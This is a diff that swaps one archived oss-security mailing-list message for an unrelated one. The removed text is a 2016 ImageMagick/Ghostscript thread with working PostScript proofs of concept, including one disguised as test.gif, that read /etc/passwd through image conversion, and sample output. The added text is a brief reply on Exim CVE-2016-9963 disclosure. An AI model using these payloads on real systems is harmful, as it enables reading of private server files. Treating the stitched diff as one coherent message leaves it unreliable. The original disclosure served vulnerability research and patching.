@@ -1,109 +1,28 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/29/28
-Message-ID: <CAJ_zFkLoaj_k74mMCFwWs+n7Mv9gwOdFa3AcyQf=W_ViHS2nag@mail.gmail.com>
-Date: Thu, 29 Sep 2016 14:28:28 -0700
-From: Tavis Ormandy <taviso@...gle.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/22/9
+Message-ID: <20161222112845.GF5082@jumper.schlittermann.de>
+Date: Thu, 22 Dec 2016 12:28:45 +0100
+From: Heiko Schlittermann <hs@...littermann.de>
 To: oss-security@...ts.openwall.com
-Subject: Re: ImageMagick identify "d:" hangs
+Subject: Re: CVE-2016-9963 Exim private information leak
 Content-Type: text/plain; charset=utf-8
 
-On Thu, Sep 29, 2016 at 5:02 AM, Tavis Ormandy <taviso@...gle.com> wrote:
-> On Wed, Sep 28, 2016 at 11:25 PM, Florian Weimer <fw@...eb.enyo.de> wrote:
->>
->> * Tavis Ormandy:
->>
->> > Here is the code I'm testing with (Note: I really don't know much
->> > postscript - and I hate it).
->> >
->> > $ cat test.ps
->> > /dumpname {
->> >     dup             % copy filename
->> >     dup             % copy filename
->> >     print           % print filename
->> >     (\n) print      % print newline
->> >     status          % stat filename
->> >     {
->> >         (stat succeeded\n) print
->> >         ( ctime:) print
->> >         64 string cvs print
->> >         ( atime:) print
->> >         64 string cvs print
->> >         ( size:) print
->> >         64 string cvs print
->> >         ( blocks:) print
->> >         64 string cvs print
->> >         (\n) print
->> >         (\n) print
->> >     }{
->> >         (unable to stat\n\n) print
->> >     } ifelse
->> >     .libfile        % open as library
->> >     {
->> >         (.libfile returned file\n\n) print
->> >         64 string readstring
->> >         pop         % discard result (should proably test)
->> >         print
->> >         (\n) print
->> >     }{
->> >         (.libfile returned string\n) print
->> >         print
->> >         (\n) print
->> >     } ifelse
->> > } def
->> >
->> > (/etc/pass*) /dumpname load 256 string filenameforall
->>
->> filenameforall was fixed as part of this:
->>
->>   http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=ab109aaeb3ddba59518b036fb288402a65cf7ce8
->>   http://bugs.ghostscript.com/show_bug.cgi?id=694724
->>
->> This also covers getenv and has already been assigned CVE-2013-5653.
->
-> Thanks Florian, that explains it, although the distros do not appear
-> to have picked that patch up.
->
->>
->> > $ identify test.ps
->> > /etc/passwd
->> > stat succeeded
->> >  ctime:1474998792 atime:1474998792 size:2662 blocks:8
->> >
->> > .libfile returned file
->>
->> .libfile is not yet fixed upstream.  I reported this upstream:
->>
->>   http://bugs.ghostscript.com/show_bug.cgi?id=697169
->
-> Thanks - seems like bad news for any automated image/document processing.
->
-> Tavis.
+Jeffrey Walton <noloader@...il.com> (Do 22 Dez 2016 12:06:41 CET):
+…
+> The bad guys already knew about the problem, or the motivated ones
+> found it after the partial disclosure.
 
-Just for future reference, here is an example of dumping a file to an
-image processed with ImageMagick that works with gs 9.20:
+Partial disclousure? I think, there was no disclosure at all, beside
+requesting a CVE and talking about a possible leak of private
+information. Is this enough to call it "partial disclousure"?
 
-$ cat test.gif
-%!PS
-/Size 20 def                             % font/line size
-/Line 0 def                              % current line
-/Buf 1024 string def                     % line buffer
-/Path 0 newpath def
+    Best regards from Dresden/Germany
+    Viele Grüße aus Dresden
+    Heiko Schlittermann
+-- 
+ SCHLITTERMANN.de ---------------------------- internet & unix support -
+ Heiko Schlittermann, Dipl.-Ing. (TU) - {fon,fax}: +49.351.802998{1,3} -
+ gnupg encrypted messages are welcome --------------- key ID: F69376CE -
+ ! key id 7CBF764A and 972EAC9F are revoked since 2015-01 ------------ -
 
-/Courier-Bold findfont Size scalefont setfont
-1 1 1 setrgbcolor clippath fill          % draw white background
-0 0 0 setrgbcolor                        % set black foreground
-
-(/etc/passwd) .libfile {
-    {
-        dup Buf readline
-        {
-            Path Line moveto show
-        }{
-            showpage
-            quit
-        } ifelse
-        % next line
-        /Line Line Size add def
-    } loop
-} if
-$ convert test.gif png:test.png
+Download attachment "signature.asc" of type "application/pgp-signature" (474 bytes)
